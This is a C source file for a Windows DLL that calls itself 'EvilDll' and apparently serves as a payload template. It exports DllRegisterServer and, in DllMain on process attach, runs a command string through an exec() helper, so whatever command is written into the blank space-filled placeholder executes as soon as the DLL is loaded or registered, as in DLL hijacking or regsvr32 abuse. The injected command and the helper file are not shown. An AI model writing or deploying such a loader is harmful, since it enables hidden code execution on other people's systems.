#include <stdio.h>
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>

#include "helper.c"

char *command = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ";


extern __declspec(dllexport) void DllRegisterServer(void)
{
    exec(command);
    //OutputDebugString("ExportedFunction: DllRegisterServer");
    //MessageBox(NULL, "Exported Function DllRegisterServer() called", "EvilDll", MB_OK);
}
 
 
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        //MessageBox(NULL, "DLL_PROCESS_ATTACH called", "EvilDll", MB_OK);
        //OutputDebugString("DLL_PROCESS_ATTACH");
        exec(command);
        break;
 
    case DLL_THREAD_ATTACH:
        //OutputDebugString("DLL_THREAD_ATTACH");
        break;
 
    case DLL_THREAD_DETACH:
        //OutputDebugString("DLL_THREAD_DETACH");
        break;
 
    case DLL_PROCESS_DETACH:
        //OutputDebugString("DLL_PROCESS_DETACH");
        break;
    }
 
    return TRUE;
}